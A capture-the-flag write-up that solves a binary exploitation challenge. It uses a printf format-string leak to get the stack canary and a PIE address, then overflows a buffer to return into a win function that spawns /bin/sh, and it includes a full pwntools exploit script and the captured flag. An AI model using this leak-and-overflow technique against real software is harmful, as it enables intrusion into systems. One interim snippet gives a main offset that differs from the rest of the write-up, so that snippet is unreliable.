# ramadhan--spark-ctf-2026-order-writeup

## step 1 - Identifying the binary
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ file main           
main: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=daa0d9885fb1965bfd766994839c1dd7c4ab9c6e, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ checksec --file main
[*] '/home/kali/Desktop/ramadhan-ctf/5-piecanary/order_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
As we can see our binary is 64-bit , it has canary which is a  random value on the stack that sit before the rbp (rbp-8) to prevent a buffer overflow , it's a position indepandent (PIE) so the addresses are randomized in each run . Also we can't execute shellcode in the stack and it's not stripped .

## step 2 - Running the binary
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ ./main
           ══════════════════════════════════
                       🌙 RAMADHAN CTF  🌙
           ══════════════════════════════════
Getting food is hard nowadays ,Good luck
Give your order : pizza
take this: pizza
eat > aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
not enough                     
```
As you can see the program takes a first input after "Give your order" and print it . And then it takes another input and exits.
Let's try to pass a format specifier to it and see if we get a leak 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ ./main
           ══════════════════════════════════
                       🌙 RAMADHAN CTF  🌙
           ══════════════════════════════════
Getting food is hard nowadays ,Good luck
Give your order : %p
take this: 0x7ffcf094c2e0
{eat > aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./main
```
Good , so i send "%p" to the first input and the program leaked to me an address so we have a format string vulnerability , and in the same time i passed a lot of bytes to the second input and we got "stack smashing detected" this means that we overwrote the canary so the program crashed .


## step 3 - debugging the binary 
I wil use gdb -q main (-q for less input in the intro) to debug the binary and type info func to list all the functions in our program 
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ gdb -q  main
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 17.1 in 0.00ms using Python engine 3.13
Reading symbols from main...
(No debugging symbols found in main)
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  __stack_chk_fail@plt
0x0000000000001050  system@plt
0x0000000000001060  printf@plt
0x0000000000001070  read@plt
0x0000000000001080  setvbuf@plt
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _start
0x00000000000010d0  deregister_tm_clones
0x0000000000001100  register_tm_clones
0x0000000000001140  __do_global_dtors_aux
0x0000000000001180  frame_dummy
0x0000000000001189  setup
0x0000000000001211  win
0x000000000000126c  main
0x00000000000012fd  vuln
0x00000000000013b0  _fini
gef➤  
```
As you can see we are interested in main,vuln and win function, let's disassemble main using disass main 
```gdb
gef➤  disass main
Dump of assembler code for function main:
   0x000000000000126c <+0>:     push   rbp
   0x000000000000126d <+1>:     mov    rbp,rsp
   0x0000000000001270 <+4>:     sub    rsp,0x10
   0x0000000000001274 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x000000000000127d <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001281 <+21>:    xor    eax,eax
   0x0000000000001283 <+23>:    mov    eax,0x0
   0x0000000000001288 <+28>:    call   0x1189 <setup>
   0x000000000000128d <+33>:    lea    rax,[rip+0xdac]        # 0x2040
   0x0000000000001294 <+40>:    mov    rdi,rax
   0x0000000000001297 <+43>:    call   0x1030 <puts@plt>
   0x000000000000129c <+48>:    lea    rax,[rip+0xe15]        # 0x20b8
   0x00000000000012a3 <+55>:    mov    rdi,rax
   0x00000000000012a6 <+58>:    call   0x1030 <puts@plt>
   0x00000000000012ab <+63>:    lea    rax,[rip+0xd8e]        # 0x2040
   0x00000000000012b2 <+70>:    mov    rdi,rax
   0x00000000000012b5 <+73>:    call   0x1030 <puts@plt>
   0x00000000000012ba <+78>:    lea    rax,[rip+0xe27]        # 0x20e8
   0x00000000000012c1 <+85>:    mov    rdi,rax
   0x00000000000012c4 <+88>:    call   0x1030 <puts@plt>
   0x00000000000012c9 <+93>:    mov    eax,0x0
   0x00000000000012ce <+98>:    call   0x12fd <vuln>
   0x00000000000012d3 <+103>:   lea    rax,[rip+0xe37]        # 0x2111
   0x00000000000012da <+110>:   mov    rdi,rax
   0x00000000000012dd <+113>:   call   0x1030 <puts@plt>
   0x00000000000012e2 <+118>:   mov    eax,0x0
   0x00000000000012e7 <+123>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000000012eb <+127>:   sub    rdx,QWORD PTR fs:0x28
   0x00000000000012f4 <+136>:   je     0x12fb <main+143>
   0x00000000000012f6 <+138>:   call   0x1040 <__stack_chk_fail@plt>
   0x00000000000012fb <+143>:   leave
   0x00000000000012fc <+144>:   ret
End of assembler dump.
gef➤  
```
It's calling vuln let's disassemble it too 
```gdb
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x00000000000012fd <+0>:     push   rbp
   0x00000000000012fe <+1>:     mov    rbp,rsp
   0x0000000000001301 <+4>:     sub    rsp,0x90
   0x0000000000001308 <+11>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001311 <+20>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001315 <+24>:    xor    eax,eax
   0x0000000000001317 <+26>:    lea    rax,[rip+0xdfe]        # 0x211c
   0x000000000000131e <+33>:    mov    rdi,rax
   0x0000000000001321 <+36>:    mov    eax,0x0
   0x0000000000001326 <+41>:    call   0x1060 <printf@plt>
   0x000000000000132b <+46>:    lea    rax,[rbp-0x90]
   0x0000000000001332 <+53>:    mov    edx,0x40
   0x0000000000001337 <+58>:    mov    rsi,rax
   0x000000000000133a <+61>:    mov    edi,0x0
   0x000000000000133f <+66>:    call   0x1070 <read@plt> <------- first input
   0x0000000000001344 <+71>:    lea    rax,[rip+0xde4]        # 0x212f
   0x000000000000134b <+78>:    mov    rdi,rax
   0x000000000000134e <+81>:    mov    eax,0x0
   0x0000000000001353 <+86>:    call   0x1060 <printf@plt>
   0x0000000000001358 <+91>:    lea    rax,[rbp-0x90]
   0x000000000000135f <+98>:    mov    rdi,rax
   0x0000000000001362 <+101>:   mov    eax,0x0
   0x0000000000001367 <+106>:   call   0x1060 <printf@plt>
   0x000000000000136c <+111>:   lea    rax,[rip+0xdc8]        # 0x213b
   0x0000000000001373 <+118>:   mov    rdi,rax
   0x0000000000001376 <+121>:   mov    eax,0x0
   0x000000000000137b <+126>:   call   0x1060 <printf@plt>
   0x0000000000001380 <+131>:   lea    rax,[rbp-0x50]
   0x0000000000001384 <+135>:   mov    edx,0xc8
   0x0000000000001389 <+140>:   mov    rsi,rax
   0x000000000000138c <+143>:   mov    edi,0x0
   0x0000000000001391 <+148>:   call   0x1070 <read@plt>  <-------- second input
   0x0000000000001396 <+153>:   nop
   0x0000000000001397 <+154>:   mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000139b <+158>:   sub    rax,QWORD PTR fs:0x28
   0x00000000000013a4 <+167>:   je     0x13ab <vuln+174>
   0x00000000000013a6 <+169>:   call   0x1040 <__stack_chk_fail@plt>
   0x00000000000013ab <+174>:   leave
   0x00000000000013ac <+175>:   ret
End of assembler dump.
gef➤  
```
As we can see this function is reading the first input and printing it with printf without using a format specifier (that what made the address leak possible) . 
And in the second read as we can see this read function start reading 0x50 bytes (80) away from the rbp so we have to overwrite it with 0x50 bytes and 8 bytes to overwrite the rbp .
But beware ! We can't just pass 88 random bytes because in rbp-8 we have the stack canary , and if we modify it the program will crash . So we need to leak it and pass it with our payload .

Now let's disassemble the win function 
```gdb
gef➤  disass win
Dump of assembler code for function win:
   0x0000000000001211 <+0>:     push   rbp
   0x0000000000001212 <+1>:     mov    rbp,rsp
   0x0000000000001215 <+4>:     sub    rsp,0x10
   0x0000000000001219 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x0000000000001222 <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001226 <+21>:    xor    eax,eax
   0x0000000000001228 <+23>:    lea    rax,[rip+0xdd9]        # 0x2008
   0x000000000000122f <+30>:    mov    rdi,rax
   0x0000000000001232 <+33>:    call   0x1030 <puts@plt>
   0x0000000000001237 <+38>:    lea    rax,[rip+0xdd2]        # 0x2010
   0x000000000000123e <+45>:    mov    rdi,rax
   0x0000000000001241 <+48>:    call   0x1030 <puts@plt>
   0x0000000000001246 <+53>:    lea    rax,[rip+0xdeb]        # 0x2038
   0x000000000000124d <+60>:    mov    rdi,rax
   0x0000000000001250 <+63>:    call   0x1050 <system@plt>
   0x0000000000001255 <+68>:    nop
   0x0000000000001256 <+69>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000125a <+73>:    sub    rax,QWORD PTR fs:0x28
   0x0000000000001263 <+82>:    je     0x126a <win+89>
   0x0000000000001265 <+84>:    call   0x1040 <__stack_chk_fail@plt>
   0x000000000000126a <+89>:    leave
   0x000000000000126b <+90>:    ret
End of assembler dump.
gef➤  x/s 0x2038
0x2038: "/bin/sh"
```
As we can see the win function is calling system and passing to it "/bin/sh" , so basically it spawns a shell in the victim's machine that what make it our goal in this challenge .

Now to summerise , we need to overwrite 72 bytes with junk , pass the leaked canary , overwrite the rbp with 8 bytes and overwrite the rip with the address of the win function .
But we still have a little problem , the binary has PIE so the addresses of functions change in every run , to be more specifique just the base is randomized in each run , but the offset remains the same . 
So along side the canary we need to leak an address of any function , subtract that function's offset from the leaked address to get the pie base and then add to it the offset of the win function 

I made a script to automate the leaking process 
```python
from pwn import*

for i in range(1, 50):
    p = process('./main')
    p.recvuntil(b"Give your order : ")
    p.sendline(f"%{i}$p".encode())
    p.recvuntil(b"take this: ")
    leak = p.recvline().decode()
    print(i , leak)
```
It basically leaks  the i-th value on the stack . After i run it i got the canary and the main function address
```bash
[+] Starting local process './main': pid 44303                                                         
31 0x55fa17cc426c                                        
[+] Starting local process './main': pid 44335
47 0x4e27ab47e0560500                                   
```
How i knew that thease are the needed addresses .
If we take a look back to the offset of main we will find it end with 0x126c so that is the address of main 
And the canary is obvious , it generally ends with 00 and looks random . 
So what we gonna do now is leaking the main_addr and the canary_addr and we got the win offset is 0x1211 so we got 
```python
main_offset = 0x1260
win_offset = 0x1211
pie_base = leaked_main_addr - main_offset
win_addr = pie_base + win_offset
```
We are also gonna need the ret gadget for the stack alignement after overwriting the rbp , i am gonna use ropper --f main to list the gadgets of this binary
```gdb
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ ropper --f main

000000000000112c: test eax, eax; je 0x1138; jmp rax; 
0x000000000000100b: test rax, rax; je 0x1012; call rax; 
0x000000000000100b: test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000000010ea: test rax, rax; je 0x10f8; jmp rax; 
0x000000000000112b: test rax, rax; je 0x1138; jmp rax; 
0x00000000000010e0: clc; je 0x10f8; mov rax, qword ptr [rip + 0x2ef6]; test rax, rax; je 0x10f8; jmp rax; 
0x000000000000120f: leave; ret; 
0x0000000000001016: ret; 

98 gadgets found      
```
As we can see the pie protection affect the also the ret instruction so we need to add it the pie base to get the address of ret

So finally our paload will be somthing like this 
```python
72 bytes + leaked_canary + 8 bytes + ret + win_addr
```

## step 4 - writing the exploit 
Now let's write out exploit 
```python
from pwn import*
context.binary = elf = ELF("./main")
context.terminal = ["tmux" , "splitw" , "-h" ]

p = elf.process() 
#p = remote("54.247.233.133",1200)


p.recvuntil(b"Give your order : ")
p.sendline(b"%47$p.%31$p")
p.recvuntil(b"take this: ")
leak =p.recvline().strip().split(b".")

pie = int(leak[1] ,16 ) 
canary = int(leak[0] , 16)

main_offset = 0x126c

pie_base = pie - main_offset

ret = pie_base + 0x1016

win_offset = 0x1211
win = pie_base + win_offset

pay = b"A"*72 + p64(canary) + b"A"*8 + p64(ret) + p64(win)
p.sendline(pay)
p.interactive()
```
As you can see i leaked the main address and the canary and i split them with "." , and i passed every one of them to a variable to use it later .

Now let's run our exploit 
```bash
┌──(kali㉿kali)-[~/Desktop/ramadhan-ctf/5-piecanary/order_handout]
└─$ python3 solve.py
[*] '/home/kali/Desktop/ramadhan-ctf/5-piecanary/order_handout/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process '/home/kali/Desktop/ramadhan-ctf/5-piecanary/order_handout/main': pid 53749
[*] Switching to interactive mode
eat > 

تمت تعبئة الكرش بنجاح
$ ls
flag.txt  leaker.py  main  solve.py
$ cat flag.txt
Spark{p1es_4nd_c4n4r1es_4re_1he_b3s1}
$ 
[*] Interrupted
[*] Stopped process '/home/kali/Desktop/ramadhan-ctf/5-piecanary/order_handout/main' (pid 53749)

```
Final flag 
```bash
Spark{p1es_4nd_c4n4r1es_4re_1he_b3s1}
```
Thank you for reading , happy pwning 



















